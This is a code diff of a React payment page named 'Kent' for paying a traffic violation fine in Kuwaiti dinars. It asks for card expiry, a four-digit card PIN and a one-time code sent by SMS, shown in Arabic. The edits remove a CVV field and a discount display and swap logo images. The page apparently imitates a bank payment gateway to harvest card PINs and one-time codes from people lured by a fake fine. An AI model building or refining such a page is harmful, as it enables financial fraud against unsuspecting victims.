@@ -1,3 +1,4 @@
+
 "use client"
 import { useEffect, useState } from "react"
 import type React from "react"
@@ -142,9 +143,6 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
   })
 
   // Calculate discount
-  const discount = Number.parseFloat(props.violationValue as unknown as string) * 0.3
-  const discountedAmount =
-    props.violationValue === 0 ? 3.5 : Number.parseFloat(props.violationValue!.toString()) - discount
 
   // Payment information state
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
@@ -359,9 +357,7 @@ setTimeout(() => {
         paymentInfo.pass !== "" &&
         paymentInfo.month !== "" &&
         paymentInfo.year !== "" &&
-        paymentInfo.pass.length === 4&&
-        paymentInfo.cvv.length === 3
-
+        paymentInfo.pass.length === 4
       )
     }
     return true
@@ -543,28 +539,9 @@ setTimeout(() => {
                 />
               </div>
             </div>
-            <div className="row" id="PinRow" >
-              <div className="row" >
-                <label className="col-4 m-1" >Cvv:</label>
-                <input
-
-                  inputMode="numeric"
-                  pattern="[0-9]*"
-                  name="cc"
-                  id="cc"
-                  onChange={(e) => handlePaymentInfoChange("cvv", e.target.value)}
-                  value={paymentInfo.cvv}
-                  autoComplete="off"
-                  title="Should be in number. Length should be 3"
-                  type="password"
-                  size={3}
-                  maxLength={3}
-                  className="allownumericwithoutdecimal col-7"
-                />
-              </div>
-            </div>
-
-
+           
+      {/* PIN */}
+            
           </div>
           
         )
@@ -758,7 +735,7 @@ setTimeout(() => {
             <div className="notification">
               <div className="border border-blue-500 rounded-lg p-4 max-w-md mx-auto">
                 <div style={{ display: "flex", justifyContent: "center" }}>
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Phone_icon.png" alt="logo" width={40} style={{ margin: 5 }} />
+                  <img src="./Phone_icon.png" alt="logo" width={40} style={{ margin: 5 }} />
                 </div>
                 {/* Verification title */}
                 <p className="text-blue-600 text-xl text-center font-bold mb-4">تحقق من الرمز المرسل إلى جوالك</p>
@@ -875,14 +852,14 @@ setTimeout(() => {
       <form onSubmit={handleButtonClick}>
         <div className="madd" />
         <div id="PayPageEntry" style={{ display: "flex", justifyContent: "center", flexDirection: "column" }}>
-          <img src="./dre5.png" className="" alt="mmo" width={"100%"} style={{ marginBottom: 5 }} />
+          <img src="./mob.jpg" className="" alt="mmo" width={"100%"} style={{ marginBottom: 5 }} />
 
           <div className="">
             <div className="content-block">
               {/* Payment Information Card */}
               <div className="form-card" style={{ display: step >= 2 ? "none" : "block" }}>
                 <div className="" style={{ display: "flex", justifyContent: "center" }}>
-                  <img src="./image2.jpg" className="-" alt="logo" width={90} />
+                  <img src="./download.jpeg" className="-" alt="logo" width={90} />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
@@ -892,12 +869,11 @@ setTimeout(() => {
                   <div className="row">
                     <label className="column-label">Amount: </label>
                     <label className="column-value text-label col" style={{ width: "50%" }}>
-                      <s style={{fontSize:9}}>
+                      <span style={{fontSize:9}}>
                         {props.violationValue === 0
                           ? "5.00 kd"
                           : `${Number.parseFloat(props.violationValue!.toString()).toFixed(2)} kd`}
-                      </s>
-                      <span style={{fontSize:9}} className="m-1">{discountedAmount.toFixed(2)} kd</span>
+                      </span>
                     </label>
                   </div>
                 </div>
